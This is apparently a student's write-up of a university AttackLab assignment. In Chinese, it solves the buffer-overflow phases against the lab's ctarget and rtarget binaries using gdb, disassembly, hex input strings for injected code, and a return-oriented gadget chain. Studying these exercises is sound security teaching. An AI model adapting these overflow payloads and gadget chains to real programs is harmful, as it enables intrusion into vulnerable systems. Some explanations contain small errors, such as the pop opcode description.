# AttackLab
## 10224507041 kevin

### 提交命令
./hex2raw < testtouch.txt | ./ctarget -q


./hex2raw < testtouch.txt | ./rtarget -q

```
00000000004018f2 <getbuf>:
  4018f2:	48 83 ec 18          	sub    $0x18,%rsp  //24字节
  4018f6:	48 89 e7             	mov    %rsp,%rdi
  4018f9:	e8 82 02 00 00       	callq  401b80 <Gets>
  4018fe:	b8 01 00 00 00       	mov    $0x1,%eax
  401903:	48 83 c4 18          	add    $0x18,%rsp
  401907:	c3                   	retq   
所开的栈有24个字节，返回地址有8个字节，所以需要输入24+8=32个十六进制数，以此来覆盖原来的返回地址

0000000000401ab0 <test>:
  401ab0:	48 83 ec 08          	sub    $0x8,%rsp
  401ab4:	b8 00 00 00 00       	mov    $0x0,%eax
  401ab9:	e8 34 fe ff ff       	callq  4018f2 <getbuf>
  401abe:	89 c2                	mov    %eax,%edx
  401ac0:	be 98 34 40 00       	mov    $0x403498,%esi
  401ac5:	bf 01 00 00 00       	mov    $0x1,%edi
  401aca:	b8 00 00 00 00       	mov    $0x0,%eax
  401acf:	e8 0c f3 ff ff       	callq  400de0 <__printf_chk@plt>
  401ad4:	48 83 c4 08          	add    $0x8,%rsp
  401ad8:	c3                   	retq   
  401ad9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
test函数callq  4018f2 <getbuf>后返回
```

## touch1
观察到touch1中没有多余的功能，故前面24位填充无效十六进制数，
后面8位跳转到touch1的地址（注意要用小端法）即可。
```
aws：
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
08 19 40 00 00 00 00 00
```

## touch2
touch2函数需要我们再输入一个参数，并存在一个比较，若参数不等于`cookie（0x4bca8e48）`则报错，
所以需要考虑如何输入参数，直接输入必然不能实现，所以首先仍是选择要跳转的目标地址，
在这里由于要输入参数，我们选择跳转到`%rsp`的位置，以便后续函数注入，借助jdb设置断点，
查看`%rsp`此时地址
```
(gdb) break *0x4018f6
Breakpoint 1 at 0x4018f6: file buf.c, line 14.
(gdb) run -q
Starting program: /home/jovyan/lab3/target30/ctarget -q
Cookie: 0x4bca8e48

Breakpoint 1, getbuf () at buf.c:14
14      buf.c: No such file or directory.
(gdb) info registers
··· ···
rsp            0x55648998       0x55648998
··· ···
```


得到了此时`%rsp`的地址
接下来我们编写程序使得第一个参数中的值变更为`cookie`，并跳转到`touch2`即可
于是编写汇编程序如下:
```
movq $0x4bca8e48,%rdi
mov $0x401934,%rsi
jmp *%rsi
ret
```
进行编译后反汇编得到十六进制文件

```
0000000000000000 <.text>:
   0:	48 c7 c7 48 8e ca 4b 	mov    $0x4bca8e48,%rdi
   7:	48 c7 c6 34 19 40 00 	mov    $0x401934,%rsi
   e:	ff e6                	jmpq   *%rsi
  10:	c3                    retq 
```

将十六进制数据整合并填充到输入中，尾部再加上`%rsp`地址即可
```
aws:
48 c7 c7 48 8e ca 4b 48 
c7 c6 34 19 40 00 ff e6
c3 00 00 00 00 00 00 00
98 89 64 55
```


## touch3
目的是调用`touch3`，与前面不同的是，这次传进的参数是一个字符串指针，同时`touch3`内部用了另外一个函数`hexmax`来比较。
本次要 比较的是与`cookie`所包含内容的字符串比较。在将`cookie`中内容转换为字符串时需注意在C语言中字符串是以`\0`结尾
，所以在字符串序列的结尾是一个字节0。
```
int hexmatch(unsigned val, char *sval)
{
     char cbuf[110];
     /* Make position of check string unpredictable */
     char *s = cbuf + random() % 100;
     sprintf(s, "%.8x", val); //s=val=cookie
     return strncmp(sval, s, 9) == 0; //比较cookie和所传入的参数的前9位是否相同
  	//注意cookie只有8字节。但是在C语言中字符串是以\0结尾，所以在字符串序列的结尾是一个字节0，
	//所以这里为9的原因是我们要比较最后一个是否为'\0'
 }
void touch3(char *sval)
 {
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) { //相同则调用成功
         printf("Touch3!: You called touch3(\"%s\")\n", sval);
         validate(3);
    } else {
         printf("Misfire: You called touch3(\"%s\")\n", sval);
         fail(3);
     }
    exit(0);
 }
 ```
在`hexmatch`函数中注意到这个函数也开辟了栈帧。并且由于` char *s = cbuf + random() % 100;*s`存放的地址是随机的。
所以字符串s的地址我们是没法估计的。并且提示中告诉了我们`hexmatch`和`strncmp`函数可能会覆盖我们getbuf的缓冲区，
这是由于`test`函数中`callq  4018f2 <getbuf>`的返回所导致的。所以我们可以把数据放到一个相对安全的栈空间里，
这里我们选择放在父帧即`test`的栈空间里。这样就不会被后续函数所覆盖。


注释图片：https://upload-images.jianshu.io/upload_images/1433829-4f564d4ccfc8b962.png?imageMogr2/auto-orient/strip|imageView2/2/format/webp

```
0000000000401ab0 <test>:
  401ab0:	48 83 ec 08          	sub    $0x8,%rsp
  401ab4:	b8 00 00 00 00       	mov    $0x0,%eax
  401ab9:	e8 34 fe ff ff       	callq  4018f2 <getbuf>
```
打断点找到存储字符串的地址，使用gdb看一下test栈空间地址。
```
(gdb) break *0x401ab4
Breakpoint 1 at 0x401ab4: file visible.c, line 92.
(gdb) run -q
Starting program: /home/jovyan/lab3/target30/ctarget -q
Cookie: 0x4bca8e48

Breakpoint 1, test () at visible.c:92
92      visible.c: No such file or directory.
(gdb) info r rsp
rsp            0x556489b8       0x556489b8
```
将这个地址写入`%rdi`并同时在攻击中覆盖原返回地址（对齐后·）时，加上字符串`cookie`转化为16进制的表示，这样`cookie`的十六进制表示就在调用。
```
aws:
48 c7 c7 b8 89 64 55 68
42 1a 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00
98 89 64 55 00 00 00 00
34 62 63 61 38 65 34 38
00
```


## touch4
这道题要求我们再次调用`touch2`函数，但是不同的是，本题采用了随机地址，用随机化使得堆栈位置在每次运行时不同。
这使得无法确定注入的代码将被放置在哪里。并且将保存堆栈的内存区域标记为不可执行，因此即使能将程序计数器设置为注入代码的开头，
程序也会出现分段错误。
所以我们采取另一种思路，使用程序中已有的代码来进行攻击，根据题目说明可知所需要的所有`gadge`t可以在`rtarget`的代码区域中找到，
该区域由函数`tart_farm`和`mid_farm`界定。我们来看这些函数：
```
0000000000401ad9 <start_farm>:
  401ad9:	b8 01 00 00 00       	mov    $0x1,%eax
  401ade:	c3                   	retq   

0000000000401adf <setval_185>:
  401adf:	c7 07 19 58 90 90    	movl   $0x90905819,(%rdi)
  401ae5:	c3                   	retq   

0000000000401ae6 <addval_407>:
  401ae6:	8d 87 2a 58 90 90    	lea    -0x6f6fa7d6(%rdi),%eax
  401aec:	c3                   	retq   

0000000000401aed <addval_494>:
  401aed:	8d 87 48 89 c7 90    	lea    -0x6f3876b8(%rdi),%eax
  401af3:	c3                   	retq   

0000000000401af4 <addval_406>:
  401af4:	8d 87 48 89 c7 90    	lea    -0x6f3876b8(%rdi),%eax
  401afa:	c3                   	retq   

0000000000401afb <getval_116>:
  401afb:	b8 48 89 c7 92       	mov    $0x92c78948,%eax
  401b00:	c3                   	retq   

0000000000401b01 <setval_113>:
  401b01:	c7 07 48 89 c7 c1    	movl   $0xc1c78948,(%rdi)
  401b07:	c3                   	retq   

0000000000401b08 <getval_313>:
  401b08:	b8 58 90 92 c3       	mov    $0xc3929058,%eax
  401b0d:	c3                   	retq   

0000000000401b0e <getval_115>:
  401b0e:	b8 48 c3 99 b7       	mov    $0xb799c348,%eax
  401b13:	c3                   	retq   

0000000000401b14 <mid_farm>:
  401b14:	b8 01 00 00 00       	mov    $0x1,%eax
  401b19:	c3                   	retq
```
观察上面函数，可知主要有两类指令，`mov`和`lea`。在题目说明所给出的表格中去解读汇编后的机器指令
发现上述函数中主要用到的指令`mov`和`pop`两种，其中：
`mov`从`%rax`到`%rdi`对应十六进制数`89 c7`。即`mov`对应`0x89`，此时从`%eax`到`%edi`对应`0xc7`。
`pop`到`%rax`对应十六进制数`90 58`，即`pop`对应`0x90`，此时`%rax`对应`0x58`。
再一次明确我们的目的：将`cookie`放到`%rdi`，并把`touch2`的地址放到栈中执行。
但是上述`gadgets`中没有直接将`cookie`输入`%rdi`中的函数，所以需要采用间接手段
为了利用`gadgets`将`cookie`输入到`%rdi`中，我们可以将`cookie`放到栈上，先调用`gadgets`中的`pop`将`cookie`
储存到`%eax`里，再调用`gadgets`中的`mov`将`%eax`中的数据传输到`%edi`中再调用`touch2`即可.
最终输入为：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00	//无效代码填满整个缓冲区以致溢出

e9 1a 40 00 00 00 00 00	//gadget1(popq %rat   ret)的起始地址覆盖原先的返回地址

48 8e ca 4b 00 00 00 00	//cookie

f7 1a 40 00 00 00 00 00	//gadget2(mov %rax,%rdi   ret)的起始地址

34 19 40 00 00 00 00 00	//touch2的起始地址
```


```
aws:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
e9 1a 40 00 00 00 00 00	
48 8e ca 4b 00 00 00 00	
f7 1a 40 00 00 00 00 00	
34 19 40 00 00 00 00 00	
```


